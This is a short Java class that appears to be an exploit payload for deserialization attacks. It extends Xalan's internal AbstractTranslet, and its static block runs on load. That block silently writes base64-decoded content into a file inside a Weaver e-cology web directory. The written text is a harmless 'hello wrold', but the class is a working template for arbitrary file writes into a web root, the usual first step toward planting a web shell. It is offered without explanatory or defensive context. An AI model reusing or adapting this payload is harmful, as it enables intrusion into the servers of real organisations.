package com.sorry.utils.custom;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.FileOutputStream;

public class  P1 extends AbstractTranslet {
    public P1() {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        try{
            String filter64 = "aGVsbG8gd3JvbGQ=";
            new FileOutputStream("D:\\WEAVER\\ecology\\wui\\theme\\ecology8\\js\\sync.txt").write(new sun.misc.BASE64Decoder().decodeBuffer(filter64));
        }catch (Exception e){}
    }
}